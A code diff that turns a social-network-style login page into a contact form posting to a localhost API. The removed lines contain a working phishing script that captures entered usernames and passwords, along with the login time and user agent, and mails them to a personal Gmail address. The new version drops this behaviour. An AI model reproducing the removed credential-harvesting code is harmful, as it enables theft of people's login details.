@@ -129,7 +129,9 @@
         }
 
         input[type="text"],
-        input[type="password"] {
+        input[type="email"],
+        input[type="password"],
+        textarea {
             width: 100%;
             padding: 12px 16px;
             font-size: 16px;
@@ -143,14 +145,23 @@
         }
 
         input[type="text"]::placeholder,
-        input[type="password"]::placeholder {
+        input[type="email"]::placeholder,
+        input[type="password"]::placeholder,
+        textarea::placeholder {
             color: #a0a0a0;
         }
 
         input[type="text"]:focus,
-        input[type="password"]:focus {
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        textarea:focus {
             border-color: #5a5a5a;
             background-color: #1a1a1a;
+        }
+
+        textarea {
+            min-height: 120px;
+            resize: vertical;
         }
 
         input.error {
@@ -319,33 +330,37 @@
 
             <div class="form-container">
                 <div class="success-message" id="successMessage">
-                    Login successful! ✓
+                    Message sent successfully! ✓
                 </div>
 
-                <form id="loginForm">
+                <form id="contactForm">
                     <div class="form-group">
-                        <input type="text" id="username" placeholder="Username, email address or mobile number"
-                            autocomplete="username">
-                        <div class="error-message" id="usernameError"></div>
+                        <input type="text" id="name" placeholder="Your name" autocomplete="name">
+                        <div class="error-message" id="nameError"></div>
                     </div>
 
                     <div class="form-group">
-                        <input type="password" id="password" placeholder="Password" autocomplete="current-password">
-                        <div class="error-message" id="passwordError"></div>
+                        <input type="email" id="email" placeholder="Email address" autocomplete="email">
+                        <div class="error-message" id="emailError"></div>
                     </div>
 
-                    <button type="submit" class="login-button" id="loginBtn">Log in</button>
+                    <div class="form-group">
+                        <input type="text" id="subject" placeholder="Subject" autocomplete="off">
+                        <div class="error-message" id="subjectError"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <textarea id="message" placeholder="Your message"></textarea>
+                        <div class="error-message" id="messageError"></div>
+                    </div>
+
+                    <button type="submit" class="login-button" id="submitBtn">Send message</button>
                 </form>
 
-                <div class="forgot-password">
-                    <a href="#forgot">Forgotten password?</a>
-                </div>
-
-                <div class="divider">OR</div>
-
                 <div class="signup-section">
-                    <button class="create-account-button" onclick="alert('Sign up feature coming soon!')">
-                        Create new account
+                    <button class="create-account-button"
+                        onclick="window.location.href = 'mailto:mallickfahad13@gmail.com'">
+                        Email us directly
                     </button>
                 </div>
             </div>
@@ -357,98 +372,115 @@
     </div>
 
     <script>
-        const form = document.getElementById('loginForm');
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const usernameError = document.getElementById('usernameError');
-        const passwordError = document.getElementById('passwordError');
-        const loginBtn = document.getElementById('loginBtn');
+        const form = document.getElementById('contactForm');
+        const nameInput = document.getElementById('name');
+        const emailInput = document.getElementById('email');
+        const subjectInput = document.getElementById('subject');
+        const messageInput = document.getElementById('message');
+        const nameError = document.getElementById('nameError');
+        const emailError = document.getElementById('emailError');
+        const subjectError = document.getElementById('subjectError');
+        const messageError = document.getElementById('messageError');
+        const submitBtn = document.getElementById('submitBtn');
         const successMessage = document.getElementById('successMessage');
-        const recipientEmail = 'mallickfahad13@gmail.com';
+
+        function clearErrors() {
+            [nameError, emailError, subjectError, messageError].forEach((error) => error.classList.remove('show'));
+            [nameInput, emailInput, subjectInput, messageInput].forEach((input) => input.classList.remove('error'));
+        }
+
+        function setError(input, errorElement, text) {
+            input.classList.add('error');
+            errorElement.textContent = text;
+            errorElement.classList.add('show');
+        }
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
+            clearErrors();
 
-            // Clear previous errors
-            usernameError.classList.remove('show');
-            passwordError.classList.remove('show');
-            usernameInput.classList.remove('error');
-            passwordInput.classList.remove('error');
-
+            const name = nameInput.value.trim();
+            const email = emailInput.value.trim();
+            const subject = subjectInput.value.trim();
+            const message = messageInput.value.trim();
             let hasError = false;
 
-            // Validate username
-            if (!usernameInput.value.trim()) {
-                usernameError.textContent = 'Username, email or phone number required.';
-                usernameError.classList.add('show');
-                usernameInput.classList.add('error');
+            if (!name) {
+                setError(nameInput, nameError, 'Name is required.');
                 hasError = true;
             }
 
-            // Validate password
-            if (!passwordInput.value) {
-                passwordError.textContent = 'Password required.';
-                passwordError.classList.add('show');
-                passwordInput.classList.add('error');
+            if (!email) {
+                setError(emailInput, emailError, 'Email is required.');
                 hasError = true;
-            } else if (passwordInput.value.length < 6) {
-                passwordError.textContent = 'Password must be at least 6 characters.';
-                passwordError.classList.add('show');
-                passwordInput.classList.add('error');
+            } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                setError(emailInput, emailError, 'Enter a valid email address.');
                 hasError = true;
             }
 
-            if (!hasError) {
-                const username = usernameInput.value.trim();
-                const password = passwordInput.value;
-                const loginTime = new Date().toLocaleString();
+            if (!subject) {
+                setError(subjectInput, subjectError, 'Subject is required.');
+                hasError = true;
+            }
 
-                // Simulate login process
-                loginBtn.disabled = true;
-                loginBtn.textContent = 'Logging in...';
+            if (!message) {
+                setError(messageInput, messageError, 'Message is required.');
+                hasError = true;
+            }
 
-                // Simulate API call delay
-                await new Promise(resolve => setTimeout(resolve, 1500));
+            if (hasError) {
+                return;
+            }
 
-                const emailBody = [
-                    'New user login details',
-                    '',
-                    `Username / Email / Mobile: ${username}`,
-                    `Password: ${password}`,
-                    `Login Time: ${loginTime}`,
-                    `User Agent: ${navigator.userAgent}`
-                ].join('\n');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
 
-                window.location.href = `mailto:${recipientEmail}?subject=${encodeURIComponent('New user login details')}&body=${encodeURIComponent(emailBody)}`;
+            try {
+                const response = await fetch('http://localhost:3000/api/contact', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ name, email, subject, message })
+                });
+
+                const result = await response.json();
+
+                if (!response.ok || !result.success) {
+                    throw new Error(result.error || 'Unable to send message.');
+                }
 
                 successMessage.classList.add('show');
-
-                await new Promise(resolve => setTimeout(resolve, 1200));
-
-                // Reset form
                 form.reset();
+            } catch (error) {
+                successMessage.textContent = error.message || 'Something went wrong. Please try again.';
+                successMessage.classList.add('show');
+                successMessage.style.backgroundColor = '#5a1d1d';
+                successMessage.style.color = '#ffb4b4';
+                successMessage.style.borderColor = '#8a2e2e';
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Send message';
+            }
+        });
+
+        [nameInput, emailInput, subjectInput, messageInput].forEach((input) => {
+            input.addEventListener('focus', () => {
+                if (input.classList.contains('error')) {
+                    input.classList.remove('error');
+                    const errorId = input.id + 'Error';
+                    const errorElement = document.getElementById(errorId);
+                    errorElement.classList.remove('show');
+                }
+
                 successMessage.classList.remove('show');
-                loginBtn.disabled = false;
-                loginBtn.textContent = 'Log in';
-            }
+                successMessage.style.backgroundColor = '#2d5016';
+                successMessage.style.color = '#31a24c';
+                successMessage.style.borderColor = '#3d6b21';
+                successMessage.textContent = 'Message sent successfully! ✓';
+            });
         });
 
-        // Remove error styling on input
-        usernameInput.addEventListener('focus', () => {
-            if (usernameInput.classList.contains('error')) {
-                usernameInput.classList.remove('error');
-                usernameError.classList.remove('show');
-            }
-        });
-
-        passwordInput.addEventListener('focus', () => {
-            if (passwordInput.classList.contains('error')) {
-                passwordInput.classList.remove('error');
-                passwordError.classList.remove('show');
-            }
-        });
-
-        // Language selector
         document.querySelector('.language-selector').addEventListener('click', () => {
             alert('Language selection: English (UK), Español, Português, etc.');
         });
